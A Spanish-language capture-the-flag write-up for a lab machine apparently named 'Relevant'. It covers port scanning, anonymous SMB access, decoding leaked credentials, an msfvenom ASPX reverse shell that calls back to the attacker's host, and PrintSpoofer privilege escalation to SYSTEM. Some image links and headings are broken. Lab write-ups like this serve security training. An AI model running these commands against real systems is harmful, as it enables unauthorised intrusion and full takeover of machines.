# Relevant

## **Escaneo de Puertos**
Lo primero que hice fue un escaneo de puertos utilizando **Nmap** para identificar los servicios activos en la máquina. Usé el comando:

```bash
nmap -sC -sV -Pn -p- IP_MAQUINA
```

Esto reveló varios puertos abiertos, siendo los más relevantes:
- **445**: Servicio SMB.
- Otros puertos que no parecían útiles en este momento.

Para profundizar en el puerto **445**, ejecuté un escaneo con los scripts `smb-enum-shares.nse` y `smb-enum-users.nse`, lo que me permitió enumerar recursos compartidos y usuarios disponibles.

![img1](./
## **Enumeración SMB**
Una vez identificado el servicio SMB, decidí interactuar con él usando herramientas como `smbclient`. Encontré un recurso compartido llamado `nt4wrksv`, que permitía acceso anónimo. Al explorar este recurso, encontré un archivo llamado `password.txt`.

![img
Descargué el archivo y al abrirlo encontré credenciales codificadas en Base64. Para decodificarlo, utilicé la herramienta **CyberChef**:

```bash
echo "CREDENCIALES_BASE64" | base64 -d
```

Esto me proporcionó las credenciales necesarias para avanzar.

---

## **Explotación Inicial**
Con las credenciales obtenidas, creé una reverse shell en formato **ASPX** usando `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=PUERTO -f aspx > shell.aspx
```

Subí este archivo al recurso SMB y lo ejecuté desde el servidor HTTP de la máquina. Esto me permitió obtener acceso inicial al sistema.

![img3](./
## **Escalada de Privilegios**
Una vez dentro, revisé los privilegios disponibles con el comando:

```bash
whoami /priv
```

Identifiqué que el privilegio `SeImpersonatePrivilege` estaba habilitado, lo cual es ideal para realizar una escalada de privilegios mediante el exploit **PrintSpoofer**.

### **Uso de PrintSpoofer**
1. Cloné el repositorio del exploit en mi máquina:
   ```bash
   git clone https://github.com/itm4n/PrintSpoofer.git
   ```
2. Compilé el ejecutable y lo subí al servidor utilizando `smbclient`.
3. Ejecuté el exploit en la máquina objetivo:
   ```bash
   PrintSpoofer.exe -i -c cmd.exe
   ```

Esto me otorgó acceso como **NT AUTHORITY\SYSTEM**, el nivel más alto de privilegios en Windows.

![img4](./img/4.pngObtención de Flags**
Con privilegios elevados, localicé las dos flags:
- **user.txt:** Ubicada en el directorio del usuario comprometido.
- **root.txt:** Encontrada en el directorio del administrador.

Ambos archivos contenían las flags necesarias para completar la máquina.

![img5](./img/ 


### ¡Máquina completada con éxito! 🎉